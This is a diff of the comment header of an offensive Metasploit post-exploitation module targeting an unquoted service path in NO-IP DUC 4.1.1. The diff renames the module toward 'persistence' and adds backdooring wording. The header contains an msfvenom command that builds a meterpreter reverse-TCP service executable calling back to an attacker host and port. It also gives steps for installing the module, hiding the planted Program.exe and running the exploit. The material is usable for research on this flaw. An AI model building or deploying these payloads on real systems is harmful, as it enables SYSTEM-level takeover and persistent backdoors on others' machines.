@@ -7,7 +7,7 @@
 
 
 ##
-# Exploit Title  : NO-IP_privilege_escalation.rb - 'Unquoted Service Path Privilege Escalation'
+# Exploit Title  : NO-IP_persistence_payload.rb - 'Unquoted Service Path vuln'
 # NO-IP Version  : 4.1.1
 # vuln Discover  : Ehsan Hosseini
 # Module Author  : pedr0 Ubuntu [r00t-3xp10it]
@@ -16,12 +16,12 @@
 #
 #
 #
-# [ DESCRIPTION ]
+# [ VULNERABILITY DESCRIPTION ]
 # NO-IP DUC v4.1.1 installs a service with an unquoted service path This enables
-# a local privilege escalation vulnerability. To exploit this vulnerability,
-# a local attacker can insert an executable file in the path of the service.
-# Rebooting the system or restarting the service will run the malicious
-# executable with elevated privileges.
+# a local privilege escalation vulnerability and persistence backdooring. To exploit
+# this vulnerability a local attacker can insert an executable file in the path of
+# the service. Rebooting the system (persistence) or restarting the service will
+# run the malicious executable with elevated privileges.
 #
 # ---------------------------------------------------------------------------
 # C:\>sc qc NoIPDUCService4                                                       
@@ -42,6 +42,13 @@
 # "Program.exe" could be placed in "C:\", and it would be executed as the
 # Local System user next time the service was restarted.
 #
+#
+# "WARNING: This module will not delete the payload deployed"
+# "WARNING: Note that only executables explicitly written to interface with the Service Control
+# Manager should be installed this way. While SC will happily accept a regular non-service binary,
+# you will receive the fatal Error 1053 when you attempt to start the service, please read the follow
+# article: http://www.howtogeek.com/50786/using-srvstart-to-run-any-application-as-a-windows-service
+#
 # [ BUILD SERVICE EXECUTABLE ]
 # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=1337 -a x86 --platform windows -f exe-service -o Program.exe
 #
@@ -53,30 +60,22 @@
 # Check pdfcDispatcher service auto-start status? => set SERVICE_STATUS true
 # use attrib to hidde your program.exe in target? => set HIDDEN_ATTRIB true
 #
-# "WARNING: This module will not delete the payload deployed"
-# "WARNING: Note that only executables explicitly written to interface with the Service Control
-# Manager should be installed this way. While SC will happily accept a regular non-service binary,
-# you will receive the fatal Error 1053 when you attempt to start the service, please read the follow
-# article: http://www.howtogeek.com/50786/using-srvstart-to-run-any-application-as-a-windows-service
-#
-#
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
-# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/NO-IP_privilege_escalation.rb
-# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/NO-IP_privilege_escalation.rb
+# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/NO-IP_persistence_payload.rb
+# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/NO-IP_persistence_payload.rb
 # Manually Path Search: root@kali:~# locate modules/post/windows/escalate
-#
 #
 #
 # [ LOAD/USE AUXILIARY ]
 # meterpreter > background
 # msf exploit(handler) > reload_all
-# msf exploit(handler) > use post/windows/escalate/NO-IP_privilege_escalation
-# msf post(NO-IP_privilege_escalation) > info
-# msf post(NO-IP_privilege_escalation) > show options
-# msf post(NO-IP_privilege_escalation) > show advanced options
-# msf post(NO-IP_privilege_escalation) > set [option(s)]
-# msf post(NO-IP_privilege_escalation) > exploit
+# msf exploit(handler) > use post/windows/escalate/NO-IP_persistence_payload
+# msf post(NO-IP_persistence_payload) > info
+# msf post(NO-IP_persistence_payload) > show options
+# msf post(NO-IP_persistence_payload) > show advanced options
+# msf post(NO-IP_persistence_payload) > set [option(s)]
+# msf post(NO-IP_persistence_payload) > exploit
 ##
  
  
